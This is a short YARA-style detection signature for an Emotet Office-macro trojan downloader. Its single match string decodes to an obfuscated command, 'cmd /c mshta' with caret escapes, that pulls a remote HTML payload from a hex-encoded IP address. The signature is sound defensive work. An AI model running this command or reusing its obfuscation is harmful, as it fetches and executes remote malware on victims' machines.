
rule TrojanDownloader_O97M_Emotet_AMDA_MTB{
	meta:
		description = "TrojanDownloader:O97M/Emotet.AMDA!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,01 00 01 00 01 00 00 "
		
	strings :
		$a_01_0 = {63 6d 64 20 2f 63 20 6d 5e 73 68 5e 74 5e 61 20 68 5e 74 74 5e 70 5e 3a 2f 5e 2f 30 78 62 39 30 37 64 36 30 37 2f 66 65 72 2f 66 65 32 2e 68 74 6d 6c } //1 cmd /c m^sh^t^a h^tt^p^:/^/0xb907d607/fer/fe2.html
	condition:
		((#a_01_0  & 1)*1) >=1
 
}